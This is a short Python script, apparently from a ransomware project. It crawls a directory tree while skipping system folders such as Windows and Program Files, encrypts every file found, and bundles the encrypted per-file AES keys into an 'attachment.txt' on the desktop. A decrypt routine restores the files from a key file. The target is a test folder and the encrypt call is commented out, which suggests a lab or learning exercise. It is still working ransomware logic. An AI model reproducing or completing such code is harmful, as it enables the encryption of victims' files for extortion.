import os
import Victim.crawler.crawler as crawl


def find_encrypted(file_list):
    result = []
    for file in file_list:
        if file.is_encrypted:
            result.append(file)
    return result


def generate_encrypted_key_file(file_list, path):
    with open(os.path.join(path, "attachment.txt"), "wb") as f:
        for file in file_list:
            f.write(file.encrypted_key)
            f.write(str.encode('~@*@~' * 30))


def get_aes_keys(path):
    encrypted_keys = None
    with open(path, "rb") as f:
        encrypted_keys = f.read().split(str.encode('~@*@~' * 30))
    return encrypted_keys[:-1]

dirs_to_skip = ["Program Files (x86)", "Program Files", "Windows", "Public", "Applications", ".DS_Store"]
start_dir = "./run_test_dir"
_file_list = crawl.crawl_files(start_dir, dirs_to_skip)


def encrypt():
    for _file in _file_list:
        #print("encrypting: " + _file.path)
        _file.encrypt()
    generate_encrypted_key_file(_file_list, "/Users/Shekar/Desktop")


def decrypt():
    keys = get_aes_keys("/Users/Shekar/Desktop/key.txt")

    for i in range(len(_file_list)):
        _file = _file_list[i]
        #print("decrypting: " + _file.path)
        _file.update_decrypted_key(keys[i])
        _file.decrypt()


#encrypt()
decrypt()

